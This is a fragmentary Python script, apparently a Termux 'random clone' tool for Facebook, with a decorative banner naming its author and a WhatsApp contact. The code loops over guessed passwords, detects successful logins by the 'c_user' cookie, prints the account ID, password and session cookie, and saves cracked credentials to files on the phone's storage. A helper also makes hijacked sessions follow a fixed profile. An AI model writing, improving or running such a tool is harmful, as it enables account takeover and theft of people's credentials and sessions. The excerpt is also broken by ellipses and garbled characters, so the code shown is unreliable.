...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100092181615565', {
...
\033[1;32m║	         \033[1;91m ─━<🌺𝐀.𝐀𝐋𝐄𝐗 NIROB🌺>━─\033[1;32m	           ║
\033[1;32m║	         \033[1;91m \033[1;32m	                                   ║
...
\033[34;1m╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝                          
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃\033[1;93m [✓] AUTHOR    \033[1;91m: \033[1;93m𝑵.𝑹𝑿 𝑵𝑰𝑹𝑶𝑩               ┃\033[32;1m✮⃝𝐀.❤︎❤︎ 𝒩ℐℛ𝒪ℬ𝄟⃝
 ┃\033[1;35m [✓] TOOL      \033[1;91m: \033[1;35mRANDOM CLONE               ┃\033[33;1m✮⃝𝐀.❤︎❤︎ 𝒩ℐℛ𝒪ℬ𝄟⃝
 ┃\033[1;91m [✓] STATUS    \033[1;91m: \033[1;91mFREE                       ┃\033[34;1m✮⃝𝐀.❤︎❤︎ 𝒩ℐℛ𝒪ℬ𝄟⃝
 ┃\033[30;1m [✓] SYSTEM    \033[1;91m: \033[30;1mDATA & WIFI                ┃\033[35;1m✮⃝𝐀.❤︎❤︎ 𝒩ℐℛ𝒪ℬ𝄟⃝
 ┃\33[1;92m [✓] GITHUB    \033[1;91m: \33[1;92mNIROB-04-CYBER             ┃\033[36;1m✮⃝𝐀.❤︎❤︎ 𝒩ℐℛ𝒪ℬ𝄟⃝
 ┃\033[1;34m [✓] FACEBOOK  \033[1;91m: \033[1;34m𝑵.𝑹𝑿 𝑵𝑰𝑹𝑶𝑩               ┃\033[37;1m✮⃝𝐀.❤︎❤︎ 𝒩ℐℛ𝒪ℬ𝄟⃝
 ┃\033[1;36m [✓] WHATSAPP  \033[1;91m: \033[1;36m+8801839270542             ┃\033[33;1m✮⃝𝐀.❤︎❤︎ 𝒩ℐℛ𝒪ℬ𝄟⃝
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
loop = 0
oks = []
cps = []
...
try:
    ...
    print(' WELCOME TO NIROB-CYBER-143 WORLD ')
...
def ak():
    os.system("clear")
    print(logo)
    print('\033[1;37m[âœ“] BD CODE    -01839270542')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[NIROB-OK] '+uid+ ' | ' +ps+ '\n\033[1;37m[\033[38;5;46mCOOKIE\033[38;5;196mâ€¢\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/NIROB-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[NIROB-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/NIROB-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
